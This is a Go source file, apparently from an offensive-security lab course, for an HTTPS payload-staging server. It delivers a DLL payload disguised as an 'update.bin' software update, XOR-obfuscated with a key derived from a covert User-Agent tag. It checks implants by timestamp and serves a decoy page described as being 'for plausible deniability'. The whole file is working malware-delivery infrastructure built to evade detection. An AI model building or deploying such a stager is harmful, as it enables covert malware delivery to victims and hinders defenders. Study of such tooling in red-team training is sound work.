package main

import (
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"time"
)

// --- Configuration (Hardcoded for Simplicity) ---
var (
	payloadPath string = "calc_dll.dll" // Path to the ORIGINAL DLL payload file
	certPath    string = "server.crt"   // Path to the TLS certificate
	keyPath     string = "server.key"   // Path to the TLS private key
	listenAddr  string = "0.0.0.0:8443" // Address:port to listen on (use 8443 if 443 needs sudo)
	verbose     bool   = true           // Enable verbose logging for the lab
)

// --- Logging (Simplified) ---
func initLogging() {
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	if verbose {
		log.Println("Verbose logging enabled.")
	}
	// In a real scenario, log to file here using logPath
}

// --- Key Derivation Constants and Functions (Copy from Lab 7.2) ---
const (
	SECTION_ALIGN_REQUIRED    = 0x53616D70 // "Samp"
	FILE_ALIGN_MINIMAL        = 0x6C652D6B // "le-k"
	PE_BASE_ALIGNMENT         = 0x65792D76 // "ey-v"
	IMAGE_SUBSYSTEM_ALIGNMENT = 0x616C7565 // "alue"
	PE_CHECKSUM_SEED          = 0x67891011 // Seed for second part
)

func getPESectionAlignmentString() string { /* ... implementation ... */
	buffer := make([]byte, 16)
	binary.LittleEndian.PutUint32(buffer[0:4], SECTION_ALIGN_REQUIRED)
	binary.LittleEndian.PutUint32(buffer[4:8], FILE_ALIGN_MINIMAL)
	binary.LittleEndian.PutUint32(buffer[8:12], PE_BASE_ALIGNMENT)
	binary.LittleEndian.PutUint32(buffer[12:16], IMAGE_SUBSYSTEM_ALIGNMENT)
	return string(buffer)
}
func verifyPEChecksumValue(seed uint32) string { /* ... implementation ... */
	result := make([]byte, 4)
	checksum := seed
	for i := 0; i < 4; i++ {
		checksum = ((checksum << 3) | (checksum >> 29)) ^ uint32(i*0x37)
		result[i] = byte(checksum & 0xFF)
	}
	return string(result)
}

func generatePEValidationKey() string { /* ... implementation ... */
	alignmentSignature := getPESectionAlignmentString()
	checksumSignature := verifyPEChecksumValue(PE_CHECKSUM_SEED)
	return alignmentSignature + checksumSignature
}

func deriveKeyFromParams(timestamp, clientID string, sharedSecret string) string { /* ... implementation ... */
	combined := sharedSecret + timestamp + clientID
	key := make([]byte, 32)
	lenCombined := len(combined)
	if lenCombined == 0 {
		return string(key)
	}
	for i := 0; i < 32; i++ {
		key[i] = combined[i%lenCombined]
	}
	return string(key)
}

// --- Rolling XOR Function (Copy from Lab 7.1, renamed) ---
func xorEncryptDecrypt(data []byte, key []byte) []byte { /* ... implementation (same as rollingXor) ... */
	keyBytes := []byte(key)
	keyLen := len(keyBytes)
	result := make([]byte, len(data))
	if len(data) == 0 {
		return []byte{}
	}
	if keyLen == 0 {
		log.Println("[!] Warning: XOR key is empty.")
		copy(result, data)
		return result
	}
	for i := 0; i < len(data); i++ {
		keyByte := keyBytes[i%keyLen] ^ byte(i&0xFF)
		result[i] = data[i] ^ keyByte
	}
	return result
}

// Extract client information from User-Agent (e.g., rv:TIMESTAMP-CLIENTID)
func extractClientInfo(userAgent string) (string, string, error) {
	re := regexp.MustCompile(`rv:(\d+)-([A-Za-z0-9_-]+)`) // Look for rv: followed by digits-alphanum/hyphen/underscore
	matches := re.FindStringSubmatch(userAgent)
	if len(matches) != 3 {
		return "", "", fmt.Errorf("invalid User-Agent format or missing rv tag")
	}
	timestamp := matches[1]
	clientID := matches[2]
	return timestamp, clientID, nil
}

// Authenticate client (simple timestamp check for this lab)
func authenticateClient(timestamp, clientID string) bool {
	ts, err := strconv.ParseInt(timestamp, 10, 64)
	if err != nil {
		log.Printf("Auth Error: Invalid timestamp format: %s", timestamp)
		return false
	}
	now := time.Now().Unix()
	// Allow a +/- 30-minute window for clock skew in this lab
	if now-ts > 1800 || ts-now > 1800 {
		log.Printf("Auth Error: Timestamp out of acceptable range (%d vs now %d)", ts, now)
		return false
	}
	// Basic check on clientID format (could be more specific)
	if len(clientID) < 5 {
		log.Printf("Auth Error: ClientID too short: %s", clientID)
		return false
	}
	// For this lab, we accept any clientID matching the placeholder format used by the client
	// In a real scenario, you might check against a known list or pattern.
	log.Printf("Timestamp valid, ClientID format acceptable: %s", clientID)
	return true
}

// --- HTTP Handlers ---

// Handler for payload delivery at /update
func handlePayloadRequest(w http.ResponseWriter, r *http.Request) {
	clientIP := r.RemoteAddr
	log.Printf("INFO: Incoming request for /update from %s", clientIP)

	userAgent := r.Header.Get("User-Agent")
	if userAgent == "" {
		log.Printf("ERROR: No User-Agent provided from %s", clientIP)
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}
	if verbose {
		log.Printf("INFO: User-Agent: %s", userAgent)
	}

	timestamp, clientID, err := extractClientInfo(userAgent)
	if err != nil {
		log.Printf("ERROR: Failed to extract client info from %s: %v", clientIP, err)
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}
	log.Printf("INFO: Extracted Timestamp: %s, ClientID: %s", timestamp, clientID)

	if !authenticateClient(timestamp, clientID) {
		log.Printf("ERROR: Authentication failed for client '%s' from %s", clientID, clientIP)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}
	log.Printf("INFO: Authentication successful for client '%s'", clientID)

	sharedSecret := generatePEValidationKey()
	encryptionKey := deriveKeyFromParams(timestamp, clientID, sharedSecret)
	// log.Printf("INFO: Derived Key (Hex): %X", []byte(encryptionKey)) // Optional: Debug logging

	payloadBytes, err := ioutil.ReadFile(payloadPath) // Read ORIGINAL DLL
	if err != nil {
		log.Printf("ERROR: Failed to read payload file '%s': %v", payloadPath, err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}
	log.Printf("INFO: Read %d bytes from payload file '%s'", len(payloadBytes), payloadPath)

	obfuscatedPayload := xorEncryptDecrypt(payloadBytes, []byte(encryptionKey))
	log.Printf("INFO: Obfuscated payload (%d bytes) ready for delivery.", len(obfuscatedPayload))

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", "attachment; filename=update.bin") // Generic filename
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(obfuscatedPayload)))
	w.WriteHeader(http.StatusOK) // Explicitly set status OK
	_, err = w.Write(obfuscatedPayload)
	if err != nil {
		log.Printf("ERROR: Failed to write payload to response for %s: %v", clientIP, err)
		// Too late to send http.Error if headers/body already partially written
		return
	}

	log.Printf("INFO: Delivered %d bytes of obfuscated payload to %s (%s)", len(obfuscatedPayload), clientID, clientIP)
}

// Default handler for plausible deniability
func handleDefault(w http.ResponseWriter, r *http.Request) {
	clientIP := r.RemoteAddr
	log.Printf("INFO: Default handler request from %s for %s", clientIP, r.URL.Path)
	// Serve a simple HTML page
	w.Header().Set("Content-Type", "text/html")
	fmt.Fprintln(w, "<html><body><h1>Service Endpoint</h1><p>OK</p></body></html>")
}

// --- Main Server Setup ---
func main() {
	initLogging()
	log.Println("[+] Starting Basic HTTPS Payload Server...")

	// Verify necessary files exist
	if _, err := os.Stat(payloadPath); os.IsNotExist(err) {
		log.Fatalf("Payload file not found: %s", payloadPath)
	}
	if _, err := os.Stat(certPath); os.IsNotExist(err) {
		log.Fatalf("TLS certificate not found: %s", certPath)
	}
	if _, err := os.Stat(keyPath); os.IsNotExist(err) {
		log.Fatalf("TLS private key not found: %s", keyPath)
	}

	// Setup HTTP handlers
	http.HandleFunc("/update", handlePayloadRequest)
	http.HandleFunc("/", handleDefault) // Catch-all for other paths

	log.Printf("INFO: Server listening on %s", listenAddr)
	log.Printf("INFO: Serving payload from: %s", payloadPath)
	log.Printf("INFO: Using TLS cert: %s, key: %s", certPath, keyPath)

	// Start HTTPS server
	err := http.ListenAndServeTLS(listenAddr, certPath, keyPath, nil) // nil uses DefaultServeMux where handlers were registered
	if err != nil {
		log.Fatalf("[-] Server failed: %v", err)
	}
}
